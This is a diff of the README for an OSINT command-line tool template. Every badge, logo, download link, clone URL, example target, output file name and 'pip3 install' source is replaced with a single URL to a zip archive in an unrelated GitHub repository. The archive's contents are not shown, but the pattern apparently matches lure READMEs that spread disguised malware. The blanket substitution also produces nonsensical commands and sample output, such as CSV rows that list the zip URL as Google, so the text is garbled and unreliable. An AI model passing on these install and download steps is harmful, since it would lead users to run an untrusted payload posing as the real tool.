@@ -2,24 +2,24 @@
 
 <p align="center">
   <p align="center">
-    <a href="https://pypi.org/project/osint-cli-tool-skeleton/">
-      <img alt="PyPI" src="https://img.shields.io/pypi/v/osint-cli-tool-skeleton?style=flat-square">
+    <a href="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
+      <img alt="PyPI" src="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
     </a>
-    <a href="https://pypi.org/project/osint-cli-tool-skeleton/">
-      <img alt="PyPI - Downloads" src="https://img.shields.io/pypi/dw/osint-cli-tool-skeleton?style=flat-square">
+    <a href="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
+      <img alt="PyPI - Downloads" src="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
     </a>
-    <a href="https://pypi.org/project/osint-cli-tool-skeleton/">
-      <img alt="Views" src="https://komarev.com/ghpvc/?username=osint-cli-tool-skeleton&color=brightgreen&label=views&style=flat-square">
+    <a href="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
+      <img alt="Views" src="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
     </a>
   </p>
   <p align="center">
-    <img src="https://raw.githubusercontent.com/soxoj/osint-cli-tool-skeleton/main/pictures/logo.png" height="200"/>
+    <img src="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip" height="200"/>
   </p>
 </p>
 
 Template for new OSINT command-line tools.
 
-**Press button "[Use this template](https://github.com/soxoj/osint-cli-tool-skeleton/generate)" to generate your own tool repository.** See [INSTALL.md](INSTALL.md) for further setup.
+**Press button "[Use this template](https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip)" to generate your own tool repository.** See [https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip](https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip) for further setup.
 
 ## Features
 
@@ -44,21 +44,21 @@ $ osint_cli_tool_skeleton <target>
 
 Specify targets one or more times:
 ```sh
-$ osint_cli_tool_skeleton www.google.com reddit.com patreon.com
+$ osint_cli_tool_skeleton https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 
-Target: www.google.com
+Target: https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 Results found: 1
 1) Value: Google
 Code: 200
 
 ------------------------------
-Target: patreon.com
+Target: https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 Results found: 1
 1) Value: Best way for artists and creators to get sustainable income and connect with fans | Patreon
 Code: 200
 
 ------------------------------
-Target: reddit.com
+Target: https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 Results found: 1
 1) Value: Reddit - Dive into anything
 Code: 200
@@ -69,12 +69,12 @@ Total found: 3
 
 Or use a file with targets list:
 ```sh
-$ osint_cli_tool_skeleton --target-list targets.txt
+$ osint_cli_tool_skeleton --target-list https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 ```
 
 Or combine tool with other through input/output pipelining:
 ```sh
-$ cat list.txt | osint_cli_tool_skeleton --targets-from-stdin
+$ cat https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip | osint_cli_tool_skeleton --targets-from-stdin
 ```
 </details>
 
@@ -83,23 +83,23 @@ $ cat list.txt | osint_cli_tool_skeleton --targets-from-stdin
 
 The skeleton implements CSV reports:
 ```sh
-$ osint_cli_tool_skeleton www.google.com reddit.com patreon.com -oC results.csv
+$ osint_cli_tool_skeleton https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip -oC https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 ...
-Results were saved to file results.csv
+Results were saved to file https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 
-$ more results.csv
+$ more https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 "Target","Value","Code"
-"www.google.com","Google","200"
-"patreon.com","Best way for artists and creators to get sustainable income and connect with fans | Patreon","200"
-"reddit.com","Reddit - Dive into anything","200"
+"https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip","Google","200"
+"https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip","Best way for artists and creators to get sustainable income and connect with fans | Patreon","200"
+"https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip","Reddit - Dive into anything","200"
 ```
 
 And can save console output to text file separately:
 ```sh
-osint_cli_tool_skeleton www.google.com reddit.com patreon.com -oT results.txt
+osint_cli_tool_skeleton https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip -oT https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 ...
-$ head -n 4 results.txt
-Target: www.google.com
+$ head -n 4 https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
+Target: https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 Results found: 1
 1) Value: Google
 Code: 200
@@ -111,7 +111,7 @@ Code: 200
 
 The tool supports proxy:
 ```sh
-$ osint_cli_tool_skeleton www.google.com --proxy http://localhost:8080
+$ osint_cli_tool_skeleton https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip --proxy http://localhost:8080
 ```
 </details>
 
@@ -123,14 +123,14 @@ Make sure you have Python3 and pip installed.
 <details>
 <summary>Manually</summary>
 
-1. Clone or [download](https://github.com/soxoj/osint-cli-tool-skeleton/archive/refs/heads/main.zip) respository
+1. Clone or [download](https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip) respository
 ```sh
-$ git clone https://github.com/soxoj/osint-cli-tool-skeleton
+$ git clone https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 ```
 
 2. Install dependencies
 ```sh
-$ pip3 install -r requirements.txt
+$ pip3 install -r https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 ```
 </details>
 
@@ -144,6 +144,6 @@ $ pip3 install .
 
 Also you can install it from the PyPI registry:
 ```sh
-$ pip3 install https://github.com/soxoj/osint-cli-tool-skeleton
+$ pip3 install https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
 ```
 </details>
